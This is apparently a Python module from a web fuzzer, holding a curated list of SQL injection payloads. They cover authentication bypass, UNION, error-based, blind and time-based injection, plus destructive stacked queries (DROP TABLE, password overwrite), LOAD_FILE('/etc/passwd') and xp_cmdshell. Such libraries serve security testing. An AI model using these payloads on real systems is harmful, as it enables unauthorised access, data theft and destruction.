"""
app/services/fuzzer/payloads/sqli.py
──────────────────────────────────────
Curated static SQL Injection payload library.
Covers classic, blind, time-based, and error-based variants.
"""

SQLI_PAYLOADS = [
    # ── Classic Authentication Bypass ──────────────────────────────────────────
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    '" OR "1"="1',
    "admin'--",
    "admin' #",
    "' OR 1=1--",
    "' OR 1=1#",
    "OR 1=1",
    "' OR 'x'='x",
    # ── Error-Based (MySQL) ────────────────────────────────────────────────────
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    # ── UNION-Based ────────────────────────────────────────────────────────────
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 UNION SELECT username,password FROM users--",
    # ── Blind Boolean-Based ────────────────────────────────────────────────────
    "' AND 1=1--",
    "' AND 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SUBSTRING(username,1,1)='a'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    # ── Time-Based Blind ──────────────────────────────────────────────────────
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "' AND SLEEP(5)--",
    "' AND 1=1 WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    "1; SELECT SLEEP(5)#",
    # ── Stacked Queries ────────────────────────────────────────────────────────
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacked','hacked')--",
    "'; UPDATE users SET password='hacked' WHERE 1=1--",
    # ── Out-of-Band ────────────────────────────────────────────────────────────
    "' AND LOAD_FILE('/etc/passwd')--",
    "'; EXEC xp_cmdshell('whoami')--",
    # ── Encoding Evasion ───────────────────────────────────────────────────────
    "%27 OR %271%27=%271",
    "' OR/**/1=1--",
    "' /*!OR*/ 1=1--",
    "' OR 0x313d31--",
]
